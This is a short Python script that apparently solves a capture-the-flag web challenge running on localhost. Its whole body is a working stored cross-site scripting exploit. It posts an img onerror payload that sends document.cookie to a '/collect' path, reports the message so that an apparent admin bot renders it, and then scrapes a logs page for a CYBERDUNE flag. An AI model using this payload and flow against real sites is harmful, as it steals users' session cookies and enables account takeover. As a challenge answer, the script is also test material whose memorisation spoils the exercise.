#!/usr/bin/env python3
import requests, time, re, sys

BASE = "http://localhost:31347"

def post_message(payload_html):
    r = requests.post(f"{BASE}/submit", data={"content": payload_html}, allow_redirects=False)
    if r.status_code in (302,303):
        return True
    print("Unexpected submit status:", r.status_code)
    return False

def get_ids():
    # quick and dirty parse of IDs from home page
    r = requests.get(f"{BASE}/")
    ids = re.findall(r"Open isolated view</a></div>\s*</div>", r.text, re.S)
    # Fallback: extract using another regex
    ids = re.findall(r"/message/([0-9a-f]{8})", r.text)
    return list(dict.fromkeys(ids))  # unique preserve order

def report(id_):
    r = requests.post(f"{BASE}/report/{id_}")
    return r.status_code == 200

def fetch_logs():
    r = requests.get(f"{BASE}/logs")
    return r.text

def main():
    payload = """<img src=x onerror="fetch('/collect?d='+encodeURIComponent(document.cookie))">"""
    assert post_message(payload), "Failed to submit payload"
    time.sleep(0.5)
    ids = get_ids()
    assert ids, "No messages found"
    target = ids[0]
    assert report(target), "Failed to queue report"
    time.sleep(2.5)
    logs = fetch_logs()
    m = re.search(r"(CYBERDUNE\{[^}]+\})", logs)
    if m:
        print("Got flag:", m.group(1))
    else:
        print("Failed to find flag in logs. Logs page output follows:\n")
        print(logs)

if __name__ == "__main__":
    main()
